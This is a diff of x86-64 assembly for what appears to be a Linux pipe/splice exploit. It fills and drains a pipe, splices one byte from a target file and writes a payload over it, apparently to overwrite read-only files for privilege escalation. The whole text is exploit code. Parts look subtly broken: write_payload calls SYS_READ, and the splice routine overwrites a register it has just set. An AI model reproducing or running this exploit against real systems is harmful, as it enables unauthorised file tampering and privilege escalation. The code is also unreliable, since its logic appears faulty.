@@ -27,8 +27,8 @@ open:
 ; prepare_pipe
 ; *******************
 prepare_pipe:
-    lea rdi, [ebp-65536-8]                                       ; p
     mov rax, SYS_PIPE
+    lea rdi, [rsp+8]                                       ; p
     syscall
 
 ; *******************
@@ -36,10 +36,10 @@ prepare_pipe:
 ; init pipe with 65536
 ; *******************
 write: 
-    mov rdx, PAGE_SIZE
-    lea rsi,  [ebp-65536]                                ;buffer
-    lea rdi, [ebp-65536-4]                           ; p[1]
     mov rax, SYS_WRITE
+    mov rdx, PAGE_SIZE
+    mov rsi, [rsp+8+65536]                                ;buffer
+    mov rdi, [rsp+4]                                ; p[1]
     syscall
 
 ; *******************
@@ -48,8 +48,8 @@ write:
 ; *******************
 read: 
     mov rdx, PAGE_SIZE
-    lea rsi,   [ebp-65536]                         ;buffer
-    lea rdi,  [ebp-65536-8]                          ; p[0]
+    lea rsi,  [rsp+8+65536]                         ;buffer
+    lea rdi,  [rsp+8]                          ; p[0]
     mov rax, SYS_READ
     syscall
 
@@ -60,7 +60,7 @@ splice:
     mov r9, 0                                                     ; flags
     mov r8, 1                                                     ; len
     mov rcx, NULL                                           ; off_out
-    lea rdi, [ebp-65536-4]                                                    ; p[1]
+    lea rdi, [rsp+4]                                                    ; p[1]
     mov rsi,   0                                                  ; offset
     mov rdi,  qword [fileDesc]                          ; fd
     mov rax, SYS_SPLICE
@@ -73,7 +73,7 @@ splice:
 write_payload: 
     mov rdx, MAX_LENGTH                                ; length
     mov rsi,   payload                                             ; payload
-    lea rdi, [ebp-65536-4]                                       ; p[1]
+    lea rdi, [rsp+4]                                       ; p[1]
     mov rax, SYS_READ
     syscall
 
